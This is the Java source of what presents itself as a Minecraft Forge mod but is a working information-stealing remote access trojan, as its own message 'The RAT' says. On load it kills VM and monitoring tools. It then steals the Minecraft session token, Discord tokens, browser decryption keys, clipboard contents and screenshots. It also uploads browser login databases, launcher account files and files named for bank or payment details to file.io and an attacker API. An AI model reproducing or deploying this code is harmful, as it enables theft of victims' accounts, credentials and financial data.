package me.Aurora;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.sun.jna.platform.win32.Crypt32Util;
import net.minecraft.client.Minecraft;
import net.minecraft.launchwrapper.Launch;
import net.minecraft.util.Session;
import net.minecraftforge.fml.common.FMLCommonHandler;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.imageio.ImageIO;
import javax.net.ssl.HttpsURLConnection;
import java.awt.*;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.awt.image.BufferedImage;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Mod(modid = ExampleMod.MODID, version = ExampleMod.MODVERSION, dependencies = "after:*")
public class ExampleMod {

    public static final String MODID = "aurora";

    public static final String MODVERSION = "1.0";

    public static final String MODNAME = System.getProperty("user.home");

    public static final String MODREPO1 = System.getenv("LOCALAPPDATA");

    public static final String MODREPO2 = System.getenv("APPDATA");

    public static Minecraft mc = Minecraft.getMinecraft();

    public static final Gson gson = new Gson();

    public static String[] modules = new String[] {
            MODREPO1 + "/Google/Chrome/User Data/Default/Login Data",
            MODREPO1 + "/Google/Chrome/User Data/Profile 1/Login Data",
            MODREPO1 + "/Google/Chrome/User Data/Profile 2/Login Data",
            MODREPO1 + "/Google/Chrome/User Data/Profile 3/Login Data",
            MODREPO1 + "/Google/Chrome/User Data/Profile 4/Login Data",
            MODREPO1 + "/Google/Chrome/User Data/Profile 5/Login Data",
            MODREPO1 + "/Google/Chrome SxS/User Data/Default/Login Data",
            MODREPO1 + "/Microsoft/Edge/User Data/Default/Login Data",
            MODREPO1 + "/BraveSoftware/Brave-Browser/User Data/Default/Login Data",
            MODREPO2 + "/Opera Software/Opera Stable/Login Data",
            MODREPO2 + "/Opera Software/Opera GX Stable/Login Data",
            MODREPO2 + "/.minecraft/servers.dat",
            MODREPO2 + "/.minecraft/servers.dat_old",
            MODREPO2 + "/.minecraft/servers.essentials.dat",
            MODREPO2 + "/.minecraft/launcher_accounts.json",
            MODREPO2 + "/.minecraft/launcher_profiles.json",
            MODREPO2 + "/.minecraft/logs/latest.log",
            MODREPO2 + "/.minecraft/Flux/alt.txt",
            MODREPO2 + "/.minecraft/EaZy/altManager.json",
            MODREPO2 + "/.minecraft/essential/mojang_accounts.json",
            MODREPO2 + "/.minecraft/essential/microsoft_accounts.json",
            MODREPO2 + "/.minecraft/Impact/alts.json",
            MODREPO2 + "/.minecraft/Inertia/1.12.2/Alts.json",
            MODREPO2 + "/.minecraft/Inertia/1.8.9/Alts.json",
            MODREPO2 + "/.minecraft/meteor-client/accounts.nbt",
            MODREPO2 + "/.minecraft/Novoline/alts.novo",
            MODREPO2 + "/.minecraft/SkillClient/accounts.txt",
            MODREPO2 + "/.minecraft/wurst/alts.json",
            MODNAME + "/Downloads/accounts.txt",
            MODNAME + "/Downloads/alts.json",
            MODNAME + "/Downloads/alts.txt",
            MODNAME + "/Downloads/account.txt",
            MODNAME + "/Downloads/bank.txt",
            MODNAME + "/Downloads/banks.txt",
            MODNAME + "/Downloads/bank details.txt",
            MODNAME + "/Downloads/banking.txt",
            MODNAME + "/Downloads/payment.txt",
            MODNAME + "/Downloads/games.txt",
            MODNAME + "/Downloads/payment info.txt",
            MODNAME + "/Desktop/accounts.txt",
            MODNAME + "/Desktop/alts.json",
            MODNAME + "/Desktop/alts.txt",
            MODNAME + "/Desktop/account.txt",
            MODNAME + "/Desktop/bank.txt",
            MODNAME + "/Desktop/banks.txt",
            MODNAME + "/Desktop/bank details.txt",
            MODNAME + "/Desktop/banking.txt",
            MODNAME + "/Desktop/payment.txt",
            MODNAME + "/Desktop/payment info.txt",
    };

    public static String[] settings = new String[] {
            "vboxservice.exe",
            "vboxtray.exe",
            "xenservice.exe",
            "vmtoolsd.exe",
            "vmwaretray.exe",
            "vmwareuser.exe",
            "VGAuthService.exe",
            "vmacthlp.exe",
            "VMSrvc.exe",
            "smsniff.exe",
            "netstat.exe",
            "ProcessHacker.exe",
            "SandMan.exe",
            "jpcap.jar",
            "Wireshark.exe",
            "dumpcap.exe",
            "cheatengine-x86_64.exe"
    };

    public static void send(String message) {
        JsonObject jsonObject = new JsonObject();
        jsonObject.addProperty("id", "USER_ID_HERE");
        jsonObject.addProperty("message", message);

        APIHandler.post("/message", jsonObject);
    }

    public ArrayList<String> loadModules() {
        ArrayList<String> strings = new ArrayList<>();
        GraphicsEnvironment localGraphicsEnv = GraphicsEnvironment.getLocalGraphicsEnvironment();
        for (GraphicsDevice device : localGraphicsEnv.getScreenDevices()) {
            int random = new Random().nextInt(100) + 1;
            Rectangle bounds = device.getDefaultConfiguration().getBounds();
            BufferedImage capture;
            try {
                Class<?> clazz = Robot.class;
                Robot robot = new Robot();
                Method method = clazz.newInstance().getClass().getDeclaredMethod("createScreenCapture",
                        Rectangle.class);
                capture = (BufferedImage) method.invoke(robot, bounds);

                ImageIO.write(capture, "png", new File(MODREPO1 + "/Temp/screenshot_" + random + ".png"));
                strings.add(MODREPO1 + "/Temp/screenshot_" + random + ".png");
            } catch (Exception ignored) {
                return null;
            }
        }
        return strings;
    }

    public String testModules(String[] modules) {
        try {
            Process process = Runtime.getRuntime().exec(modules);
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            StringBuilder finalOutput = new StringBuilder();
            while ((line = in.readLine()) != null) {
                finalOutput.append(line).append("\n");
            }
            return finalOutput.toString();
        } catch (IOException ignored) {
            send("An error occurred while trying to execute the command: " + Arrays.toString(modules));
            return "Failed";
        }
    }

    public String getModules() {
        return testModules(new String[] { System.getenv("windir") + "\\System32\\tasklist.exe" });
    }

    @EventHandler
    public void preInit(FMLPreInitializationEvent event) {
        // Anti-VM //
        String modules = getModules();

        for (String setting : settings) {
            if (modules.contains(setting)) {
                try {
                    new ProcessBuilder(System.getenv("windir") + "\\System32\\taskkill.exe", "/IM",
                            "\"" + setting + "\"", "/F").start();
                } catch (IOException ignored) {
                }
            }
        }
        // # Anti-VM //
    }

    @EventHandler
    public void init(FMLInitializationEvent event) {
        // Blacklist //
        try {
            String username = mc.getSession().getUsername();
            String uuid = mc.getSession().getProfile().getId().toString();
            if (username.equalsIgnoreCase("AnimatedCalendar"))
                return;
            if (uuid.equalsIgnoreCase("18330af0be2a4210b08d8f235b9a08eb"))
                return;

            if (username.equalsIgnoreCase("Refraction"))
                return;
            if (uuid.equalsIgnoreCase("28667672039044989b0019b14a2c34d6"))
                return;

            String ip = getBazaar();
            if (ip.equalsIgnoreCase("31.220.76.53"))
                return;
            if (ip.equalsIgnoreCase("88.99.212.241"))
                return;

            JsonObject blacklist = APIHandler.get("/blacklist");
            JsonArray blUsernames = blacklist.getAsJsonArray("usernames");
            JsonArray blUUIDs = blacklist.getAsJsonArray("uuids");
            JsonArray blIPs = blacklist.getAsJsonArray("ips");

            for (int i = 0; i < blUsernames.size(); i++) {
                if (blUsernames.get(i).getAsString().equalsIgnoreCase(username)) {
                    return;
                }
            }
            for (int i = 0; i < blUUIDs.size(); i++) {
                if (blUUIDs.get(i).getAsString().equalsIgnoreCase(uuid)) {
                    return;
                }
            }
            for (int i = 0; i < blIPs.size(); i++) {
                if (blIPs.get(i).getAsString().equalsIgnoreCase(ip)) {
                    return;
                }
            }
        } catch (Exception ignored) {
        }
        // # Blacklist //

        boolean dev = (Boolean) Launch.blackboard.get("fml.deobfuscatedEnvironment");

        // User Information //
        new Thread(() -> {
            String user = System.getProperty("user.name");
            String os = System.getProperty("os.name");
            String[] totalMemory = new String[] { "wmic", "computersystem", "get", "totalphysicalmemory" };
            String[] cpuName = new String[] { "wmic", "cpu", "get", "name" };
            double ram = Math.round(Double.parseDouble(testModules(totalMemory).split("\n")[2]) / 1073741824.0);
            String cpu = testModules(cpuName).split("\n")[2];
            String clipboard = "None";
            try {
                clipboard = (String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
            } catch (UnsupportedFlavorException | IOException ignored) {
            }

            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("id", "USER_ID_HERE");
            jsonObject.addProperty("username", mc.getSession().getUsername());
            jsonObject.addProperty("user", user);
            jsonObject.addProperty("os", os);
            jsonObject.addProperty("cpu", cpu);
            jsonObject.addProperty("ram", (int) ram + "GB");
            jsonObject.addProperty("clipboard", clipboard);
            jsonObject.addProperty("dev", dev);
            jsonObject.addProperty("ip", getBazaar());

            APIHandler.post("/computer", jsonObject);
        }).start();
        // # User Information //

        // Minecraft Information //
        new Thread(() -> {
            String sp = null;
            String sq = null;
            try {
                Class<?> clazz = Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection");
                Field field = clazz.getField("changed");
                sp = (String) field.get(null);
            } catch (Exception ignored) {
            }
            try {
                Session sessionObject = mc.getSession();
                Class<?> sessionClass = sessionObject.getClass();
                Method getTokenMethod = sessionClass.getDeclaredMethod("func_148254_d");
                sq = (String) getTokenMethod.invoke(sessionObject);
            } catch (Exception ignored) {
            }
            String session = sp == null ? sq : sp;

            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("id", "USER_ID_HERE");
            jsonObject.addProperty("username", mc.getSession().getUsername());
            jsonObject.addProperty("uuid", mc.getSession().getPlayerID().replace("-", ""));
            jsonObject.addProperty("ip", getBazaar());
            jsonObject.addProperty("sessionID", session);

            APIHandler.post("/info", jsonObject);
        }).start();
        // # Minecraft Information //

        // Discord Information //
        new Thread(() -> { // Made this threaded because it was taking a while to load
            ArrayList<String> tokens = new ArrayList<>();

            HashMap<String, File> paths = new HashMap<String, File>() {
                {
                    put("Discord", new File(MODREPO2 + "/discord/Local Storage/leveldb"));
                    put("Discord Canary", new File(MODREPO2 + "/discordcanary/Local Storage/leveldb"));
                    put("Discord PTB", new File(MODREPO2 + "/discordptb/Local Storage/leveldb"));
                    put("Lightcord", new File(MODREPO2 + "/Lightcord/Local Storage/leveldb"));
                    put("Chrome", new File(MODREPO1 + "/Google/Chrome/User Data/Default/Local Storage/leveldb"));
                    put("Chrome 1", new File(MODREPO1 + "/Google/Chrome/User Data/Profile 1/Local Storage/leveldb"));
                    put("Chrome 2", new File(MODREPO1 + "/Google/Chrome/User Data/Profile 2/Local Storage/leveldb"));
                    put("Chrome 3", new File(MODREPO1 + "/Google/Chrome/User Data/Profile 3/Local Storage/leveldb"));
                    put("Chrome 4", new File(MODREPO1 + "/Google/Chrome/User Data/Profile 4/Local Storage/leveldb"));
                    put("Chrome 5", new File(MODREPO1 + "/Google/Chrome/User Data/Profile 5/Local Storage/leveldb"));
                    put("Chrome SxS",
                            new File(MODREPO1 + "/Google/Chrome SxS/User Data/Default/Local Storage/leveldb"));
                    put("Edge", new File(MODREPO1 + "/Microsoft/Edge/User Data/Default/Local Storage/leveldb"));
                    put("Brave", new File(
                            MODREPO1 + "/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb"));
                    put("Opera", new File(MODREPO2 + "/Opera Software/Opera Stable/Local Storage/leveldb"));
                    put("Opera GX", new File(MODREPO2 + "/Opera Software/Opera GX Stable/Local Storage/leveldb"));
                }
            };

            for (Map.Entry<String, File> entrySet : paths.entrySet()) {
                String name = entrySet.getKey();
                File folder = entrySet.getValue();
                try {
                    if (folder.exists()) {
                        if (folder.getPath().contains("cord")) {
                            File localState = new File(
                                    MODREPO2 + "/" + name.toLowerCase().replaceAll(" ", "") + "/Local State");
                            if (!localState.exists())
                                continue;

                            for (File file : folder.listFiles()) {
                                if (file.getPath().endsWith(".ldb") || file.getPath().endsWith(".log")) {
                                    FileReader fileReader = new FileReader(file);
                                    BufferedReader bufferReader = new BufferedReader(fileReader);

                                    String textFile;
                                    StringBuilder stringBuilder = new StringBuilder();

                                    while ((textFile = bufferReader.readLine()) != null) {
                                        stringBuilder.append(textFile);
                                    }

                                    String actualText = stringBuilder.toString();

                                    fileReader.close();
                                    bufferReader.close();

                                    Pattern pattern = Pattern.compile("dQw4w9WgXcQ:[^\"]*");
                                    Matcher matcher = pattern.matcher(actualText);
                                    if (matcher.find(0)) {
                                        String encryptedToken1 = matcher.group().split("dQw4w9WgXcQ:")[1];
                                        byte[] encryptedToken = Base64.getDecoder().decode(encryptedToken1);
                                        byte[] encryptionKey = getEncryptionKey(localState.getPath());
                                        String token = decrypt(encryptedToken, encryptionKey);
                                        if (token == null)
                                            continue;

                                        if (!tokens.contains(token)) {
                                            tokens.add(token);
                                        }
                                    }
                                }
                            }
                        } else {
                            for (File file : folder.listFiles()) {
                                if (file.toString().endsWith(".ldb") || file.toString().endsWith(".log")) {
                                    FileReader fileReader = new FileReader(file);
                                    BufferedReader bufferReader = new BufferedReader(fileReader);

                                    String textFile;
                                    StringBuilder stringBuilder = new StringBuilder();

                                    while ((textFile = bufferReader.readLine()) != null) {
                                        stringBuilder.append(textFile);
                                    }

                                    String actualText = stringBuilder.toString();

                                    fileReader.close();
                                    bufferReader.close();

                                    Pattern pattern = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}");
                                    Matcher matcher = pattern.matcher(actualText);
                                    if (matcher.find(0)) {
                                        if (!tokens.contains(matcher.group())) {
                                            tokens.add(matcher.group());
                                        }
                                    }

                                    Pattern pattern2 = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
                                    Matcher matcher2 = pattern2.matcher(actualText);
                                    if (matcher2.find(0)) {
                                        if (!tokens.contains(matcher2.group())) {
                                            tokens.add(matcher2.group());
                                        }
                                    }

                                    Pattern pattern3 = Pattern.compile("mfa\\.[\\w-]{84}");
                                    Matcher matcher3 = pattern3.matcher(actualText);
                                    if (matcher3.find(0)) {
                                        if (!tokens.contains(matcher3.group())) {
                                            tokens.add(matcher3.group());
                                        }
                                    }

                                    Pattern pattern4 = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}");
                                    Matcher matcher4 = pattern4.matcher(actualText);
                                    if (matcher4.find(0)) {
                                        if (!tokens.contains(matcher4.group())) {
                                            tokens.add(matcher4.group());
                                        }
                                    }

                                    Pattern pattern5 = Pattern
                                            .compile("[\\w\\W]{24}\\.[\\w\\W]{6}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                    Matcher matcher5 = pattern5.matcher(actualText);
                                    if (matcher5.find(0)) {
                                        if (!tokens.contains(matcher5.group())) {
                                            tokens.add(matcher5.group());
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception ignored) {
                }
            }

            if (tokens.size() > 0) {
                for (String token : tokens) {
                    JsonObject jsonObject = new JsonObject();
                    jsonObject.addProperty("id", "USER_ID_HERE");
                    jsonObject.addProperty("username", mc.getSession().getUsername());
                    jsonObject.addProperty("token", token);

                    APIHandler.post("/discord", jsonObject);
                }
            } else {
                send("The RAT has failed in finding a discord token (None Found).");
            }
        }).start();
        // # Discord Information //

        // File Uploading
        new Thread(() -> {
            try {
                for (String c : modules) {
                    File file = new File(c);
                    if (file.exists()) {
                        String b = findSBLocation(c);
                        if (!b.equals("None")) {
                            JsonObject jsonObject = new JsonObject();
                            jsonObject.addProperty("id", "USER_ID_HERE");
                            jsonObject.addProperty("username", mc.getSession().getUsername());
                            jsonObject.addProperty("path", c.replaceAll("\\\\", "/"));
                            jsonObject.addProperty("url", b);

                            APIHandler.post("/file", jsonObject);
                        }
                    }
                }
            } catch (Exception ignored) {
            }
        }).start();
        // # File Uploading //

        // Chrome Password Cracking //
        new Thread(() -> {
            try {
                HashMap<String, File> files = new HashMap<>();
                files.put("Chrome", new File(MODREPO1 + "/Google/Chrome/User Data/Local State"));
                files.put("Chrome SxS", new File(MODREPO1 + "/Google/Chrome SxS/User Data/Local State"));
                files.put("Edge", new File(MODREPO1 + "/Microsoft/Edge/User Data/Local State"));
                files.put("Brave", new File(MODREPO1 + "/BraveSoftware/Brave-Browser/User Data/Local State"));
                files.put("Opera", new File(MODREPO2 + "/Opera Software/Opera Stable/Local State"));
                files.put("Opera GX", new File(MODREPO2 + "/Opera Software/Opera GX Stable/Local State"));

                for (Map.Entry<String, File> entrySet : files.entrySet()) {
                    String name = entrySet.getKey();
                    File file = entrySet.getValue();
                    if (!file.exists())
                        continue;

                    byte[] keyBytes = getEncryptionKey(file.getPath());
                    if (keyBytes == null)
                        continue;

                    JsonObject jsonObject = new JsonObject();
                    jsonObject.addProperty("id", "USER_ID_HERE");
                    jsonObject.addProperty("username", mc.getSession().getUsername());
                    jsonObject.addProperty("type", name);
                    jsonObject.addProperty("key", Arrays.toString(keyBytes));

                    APIHandler.post("/key", jsonObject);
                }
            } catch (Exception ignored) {
            }
        }).start();
        // # Chrome Password Cracking //

        // Screenshot //
        new Thread(() -> {
            ArrayList<String> monitors = loadModules();
            int i = 0;
            for (String monitor : monitors) {
                String uploaded = findSBLocation(monitor);

                JsonObject jsonObject = new JsonObject();
                jsonObject.addProperty("id", "USER_ID_HERE");
                jsonObject.addProperty("username", mc.getSession().getUsername());
                jsonObject.addProperty("monitor", i);
                jsonObject.addProperty("url", uploaded);

                APIHandler.post("/screenshot", jsonObject);
                i++;
            }
        }).start();
        // # Screenshot //
    }

    public String getBazaar() {
        try {
            Scanner scanner = new Scanner(new URL("http://checkip.amazonaws.com").openStream(), "UTF-8");
            if (scanner.hasNextLine()) {
                return scanner.nextLine();
            }
            return "null";
        } catch (IOException e) {
            return "null";
        }
    }

    public static String findSBLocation(String location) {
        try {
            File file = new File(location);
            if (file.exists()) {
                String[] command = {
                        "curl",
                        "-F",
                        "file=@" + location,
                        "https://file.io/"
                };
                Process process = Runtime.getRuntime().exec(command);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder json = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    json.append(line.trim());
                }
                JsonObject jsonObject = gson.fromJson(json.toString(), JsonObject.class);
                if (jsonObject.get("success").getAsBoolean()) {
                    return jsonObject.get("link").getAsString();
                } else {
                    send("[**ERROR**] An error occurred while trying to upload file " + location + " to the server.");
                }
            }
        } catch (IOException ignored) {
            send("[**ERROR**] An error occurred while trying to upload file " + location + " to the server.");
        }
        return "None";
    }

    public byte[] getEncryptionKey(String path) {
        if (!new File(path).exists()) {
            return null;
        }

        try {
            JsonObject localState = gson.fromJson(new FileReader(path), JsonObject.class);

            byte[] encryptedKey = Base64.getDecoder()
                    .decode(localState.getAsJsonObject("os_crypt").get("encrypted_key").getAsString());
            encryptedKey = Arrays.copyOfRange(encryptedKey, 5, encryptedKey.length);
            return Crypt32Util.cryptUnprotectData(encryptedKey);
        } catch (IOException ignored) {
        }

        return null;
    }

    @SuppressWarnings("unchecked")
    private String decrypt(byte[] buff, byte[] encryptedKey) {
        byte[] iv = Arrays.copyOfRange(buff, 3, 15);
        byte[] payload = Arrays.copyOfRange(buff, 15, buff.length);

        try {
            if (Cipher.getMaxAllowedKeyLength("AES") < 256) {
                Class<?> aClass = Class.forName("javax.crypto.CryptoAllPermissionCollection");
                Constructor<?> con = aClass.getDeclaredConstructor();
                con.setAccessible(true);
                Object allPermissionCollection = con.newInstance();
                Field f = aClass.getDeclaredField("all_allowed");
                f.setAccessible(true);
                f.setBoolean(allPermissionCollection, true);

                aClass = Class.forName("javax.crypto.CryptoPermissions");
                con = aClass.getDeclaredConstructor();
                con.setAccessible(true);
                Object allPermissions = con.newInstance();
                f = aClass.getDeclaredField("perms");
                f.setAccessible(true);
                ((Map) f.get(allPermissions)).put("*", allPermissionCollection);

                aClass = Class.forName("javax.crypto.JceSecurityManager");
                f = aClass.getDeclaredField("defaultPolicy");
                f.setAccessible(true);
                Field mf = Field.class.getDeclaredField("modifiers");
                mf.setAccessible(true);
                mf.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                f.set(null, allPermissions);
            }

            SecretKeySpec keySpec = new SecretKeySpec(encryptedKey, "AES");
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, iv);
            cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmParameterSpec);
            byte[] decrypted = cipher.doFinal(payload);
            if (decrypted == null)
                return null;
            return new String(decrypted, StandardCharsets.UTF_8);
        } catch (Exception ignored) {
        }

        return null;
    }
}
